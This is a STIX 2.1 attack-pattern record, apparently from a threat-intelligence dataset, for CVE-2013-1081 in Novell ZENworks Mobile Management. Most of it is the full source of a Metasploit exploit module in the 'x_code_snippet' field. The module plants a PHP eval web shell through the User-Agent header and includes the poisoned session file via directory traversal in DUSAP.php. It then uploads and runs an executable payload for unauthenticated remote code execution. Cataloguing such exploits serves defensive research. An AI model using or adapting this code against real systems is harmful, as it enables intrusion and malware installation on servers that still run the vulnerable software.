{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--06a34d18-58bc-4cbe-a9fa-e46ebd10fb74",
    "created": "2024-08-14T16:55:01.252562Z",
    "modified": "2024-08-14T16:55:01.252566Z",
    "name": "Novell Zenworks Mobile Managment MDM.php Local File Inclusion Vulnerability",
    "description": " This module exercises a vulnerability in Novel Zenworks Mobile Management's Mobile Device Management component which can allow unauthenticated remote code execution. Due to a flaw in the MDM.php script's input validation remote attackers can both upload and execute code via a directory traversal flaw exposed in the 'language' parameter of a POST call to DUSAP.php. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/novell_mdm_lfi.rb",
            "external_id": "novell_mdm_lfi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1081"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/kb/doc.php?id=7011895"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'           => 'Novell Zenworks Mobile Managment MDM.php Local File Inclusion Vulnerability',\n      'Description'    => %q{\n        This module exercises a vulnerability in Novel Zenworks Mobile Management's Mobile Device Management component\n        which can allow unauthenticated remote code execution. Due to a flaw in the MDM.php script's input validation,\n        remote attackers can both upload and execute code via a directory traversal flaw exposed in the 'language'\n        parameter of a POST call to DUSAP.php.\n      },\n      'Author'         =>\n        [\n          'steponequit', # Metasploit module\n          'Andrea Micalizzi (aka rgod)' #zdi report\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Novell Zenworks Mobile Device Management on Windows', {} ],\n        ],\n      'DefaultTarget'  => 0,\n      'References'     =>\n        [\n          ['CVE', '2013-1081'],\n          ['OSVDB', '91119'],\n          ['ZDI', '13-087'],\n          ['URL', 'http://www.novell.com/support/kb/doc.php?id=7011895']\n        ],\n      'DisclosureDate' => \"Mar 13 2013\",\n      'License'        => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/']),\n      OptInt.new('RPORT', [true, \"Default remote port\", 80])\n    ])\n\n    register_advanced_options([\n      OptBool.new('SSL', [true, \"Negotiate SSL connection\", false])\n    ])\n  end\n\n  def get_version\n    version = nil\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => target_uri.path\n    })\n\n    if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)\n      version = res.body.to_s.match(/<p id=\"version\">Version (.*)<\\/p>/)[1]\n    end\n\n    return version\n  end\n\n  def check\n    v = get_version\n    print_status(\"Detected version: #{v || 'Unknown'}\")\n\n    if v.nil?\n      return Exploit::CheckCode::Unknown\n    elsif v =~ /^2\\.6\\.[01]/ or v =~ /^2\\.7\\.0/\n      # Conditions based on OSVDB info\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def setup_session()\n    sess = Rex::Text.rand_text_alpha(8)\n    cmd = Rex::Text.rand_text_alpha(8)\n    res = send_request_cgi({\n      'agent' => \"<?php echo(eval($_GET['#{cmd}'])); ?>\",\n      'method' => \"HEAD\",\n      'uri' => normalize_uri(\"#{target_uri.path}/download.php\"),\n      'headers' => {\"Cookie\" => \"PHPSESSID=#{sess}\"},\n    })\n    return sess,cmd\n  end\n\n  def upload_shell(session_id,cmd_var)\n    fname   = Rex::Text.rand_text_alpha(8)\n    payload = generate_payload_exe\n    cmd     = \"$wdir=getcwd().'\\\\\\\\..\\\\\\\\..\\\\\\\\php\\\\\\\\temp\\\\\\\\';\"\n    cmd    << \"file_put_contents($wdir.'#{fname}.exe',\"\n    cmd    << \"base64_decode(file_get_contents('php://input')));\"\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"DUSAP.php\"),\n      'data'     => Rex::Text.encode_base64(payload),\n      'vars_get' => {\n        'language' => \"res/languages/../../../../php/temp/sess_#{session_id}\",\n        cmd_var    => cmd\n      }\n    })\n    return fname\n  end\n\n  def exec_shell(session_id,cmd_var,fname)\n    cmd  = \"$wdir=getcwd().'\\\\\\\\..\\\\\\\\..\\\\\\\\php\\\\\\\\temp\\\\\\\\';\"\n    cmd << \"$cmd=$wdir.'#{fname}';\"\n    cmd << \"$output=array();\"\n    cmd << \"$handle=proc_open($cmd,array(1=>array('pipe','w')),\"\n    cmd << \"$pipes,null,null,array('bypass_shell'=>true));\"\n    cmd << \"if (is_resource($handle)){fclose($pipes[1]);proc_close($handle);}\"\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"DUSAP.php\"),\n      'data'     => Rex::Text.encode_base64(payload),\n      'vars_get' => {\n        'language' => \"res/languages/../../../../php/temp/sess_#{session_id}\",\n        cmd_var    => cmd\n      }\n    })\n  end\n\n\n  def exploit()\n    begin\n      print_status(\"Checking application version...\")\n      v = get_version\n      if v.nil?\n        print_error(\"Unable to detect version, abort!\")\n        return\n      end\n\n      print_good(\"Found Version #{v}\")\n      print_status(\"Setting up poisoned session\")\n      session_id,cmd = setup_session()\n      print_status(\"Uploading payload\")\n      fname = upload_shell(session_id,cmd)\n      print_status(\"Executing payload\")\n      exec_shell(session_id,cmd,fname)\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    rescue ::OpenSSL::SSL::SSLError => e\n      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "\"Mar 13 2013\"",
    "x_mitre_platforms": [
        "win'"
    ]
}